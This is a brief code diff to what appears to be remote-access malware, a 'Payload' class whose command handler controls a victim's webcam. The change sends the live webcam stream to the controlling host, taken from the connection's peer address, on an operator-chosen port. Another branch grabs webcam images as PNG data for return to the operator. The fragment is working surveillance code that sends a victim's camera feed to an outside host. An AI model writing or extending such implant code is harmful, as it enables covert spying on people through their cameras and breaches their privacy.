@@ -626,7 +626,9 @@ class Payload():
                 elif not args[1].isdigit():
                     log("Error - port must be integer between 1 - 65355")
                 else:
-                    globals()['webcam'].stream(port=args[1])
+                    host, _ = self.connection.getpeername()
+                    port = int(args[1])
+                    globals()['webcam'].stream(host=host, port=port)
             elif 'image' in args:
                 img = globals()['webcam'].image(*args)
                 data = {"png": img}
